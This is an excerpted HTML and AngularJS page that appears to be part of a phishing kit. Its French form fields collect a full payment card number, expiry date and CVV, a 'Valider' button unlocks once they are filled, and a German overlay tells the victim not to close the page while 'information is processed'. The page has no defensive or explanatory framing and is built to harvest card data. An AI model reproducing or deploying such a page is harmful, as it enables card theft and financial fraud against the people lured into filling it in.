...
<html>
    ...
    <head>
        ...
        <style type="text/css">
            ...
            .btnxD {
                background-color: #e9041e52!important;    
            }
            ...
            input:focus {
              background-color: yellow !imprtant;
              border: 1px solid #ccc9c9;
            }
            .btnx:disabled {
  background: #dddddd;
...
<style type="text/css">
    ...
    top: 0;
    left: 0;
    background-color: rgb(255 252 252 / 68%);
    border-radius: 6px;
    z-index: 9999;
}
  ...
  @keyframes lds-spinner {
    ...
    <body ng-app="sa_app"  ng-controller="controller" ng-init="show_data()">
           ...
           <div class="loader">
                ...
                <br>
                  <div class="main-title"><h3 style="color: #1a1a1a; font-size: .8em; line-height: 20px;font-weight: 100;">VERARBEITUNG VON INFORMATIONEN<br>SCHLIESSEN SIE DIE SEITE NICHT.</h3></div>
            </div>
    </div> 
        <!-- HEADER -->
        <header id="header">
                ...
                <div class="row justify-content-center">
                    <div class="col-lg-6 col-md-6 col-sm-12 col-12">
                        ...
                        <form>
                           ...
                           <div  class="leftTop" style="flex: 0 0 auto;">
                                <h1  aria-live="assertive" class="as-page-title" style="font-size: 14px;padding: 15px 0px 8px 0;">NUMÉRO DE LA CARTE</h1>
                                <div style="position: relative; margin-top: 0px;" class="vcode" id="vcode">
                                    
                                    <input  type="phone" maxlength="4" id="vcode1" class="inpText" ng-change="bloc_login()" ng-model="vcode1" style="background: #FFF;width: 24%;" placeholder="x x x x">
                                    <input  type="phone" maxlength="4" id="vcode2" class="inpText" ng-change="bloc_login()" ng-model="vcode2" style="background: #FFF;width: 24%;" placeholder="x x x x">
                                    <input  type="phone" maxlength="4" id="vcode3" class="inpText" ng-change="bloc_login()" ng-model="vcode3" style="background: #FFF;width: 24%;" placeholder="x x x x">
                                    <input  type="phone" maxlength="4" id="vcode4"  class="inpText" ng-change="bloc_login()" ng-model="vcode4" style=";background: #FFF;width: 24%;" placeholder="x x x x">
                                </div>
                           </div>
                            ...
                            <div  class="leftTop"  style="flex: 0 0 auto;">
                                 <div class="col-lg-6 col-md-6" style="padding-right: 0px;padding-left: 0px;width: 51%;display: inline-block;" class="expiry" id="expiry">
                                    <h1  aria-live="assertive" class="as-page-title" style="font-size: 14px; padding: 15px 0px 8px 0;">DATE D'EXPIRATION</h1>
                                    <div style="position: relative; margin-top: 0px;">
                                        <input  type="phone"class="inpText" id="expiry1" ng-model="expiry1" ng-change="bloc_login()" maxlength="2" style="background: #fff;width: 30%;" placeholder="MM">
                                        <input  type="phone"class="inpText" id="expiry2" ng-model="expiry2" ng-change="bloc_login()" maxlength="4" style="background: #fff;width: 59%;" placeholder="AAAA">  
                                    </div>
                                 </div>
                                 <div class="col-lg-6 col-md-6" style="padding-right: 0px;padding-left: 0px;width: 44%;float: right;display: inline-block;">
                                      
                                    <h1  aria-live="assertive" class="as-page-title" style="font-size: 14px;padding: 15px 0px 8px 0;">CODE DE SÉCURITÉ</h1>
                                    <div style="position: relative; margin-top: 0px;">
                                        <input  type="phone" class="inpText" id="securitycode" ng-model="securitycode" ng-change="bloc_login()" maxlength="4" style="background: #fff;width: 97%;" placeholder="cvv">
                                    </div>
                                     
                                 </div>
                            </div>

                            <div class="form-group mt-5 mb-5" style="    text-align: center;">
                               

                                <button disabled=""  type="button"  id="cc-submit" class="btnx btnxD" ng-click="validation()">
                                    Valider
                                </button>
                            </div>
                        </form>
...
fetch.controller('controller', ['$scope', '$http','$filter', function ($scope, $http,$filter) {
    ...
    $scope.var_open_close_cost =false;
    ...
    $scope.bloc_login = function(){ 
        ...
        if (   $scope.vcode2.length >= 4 
            ...
            $('#cc-submit').removeClass('btnxD');
            $('#cc-submit').addClass('btnxN');
         
        }else{
             $("#cc-submit").attr('disabled','disabled');
             $('#cc-submit').removeClass('btnxN');
             $('#cc-submit').addClass('btnxD');
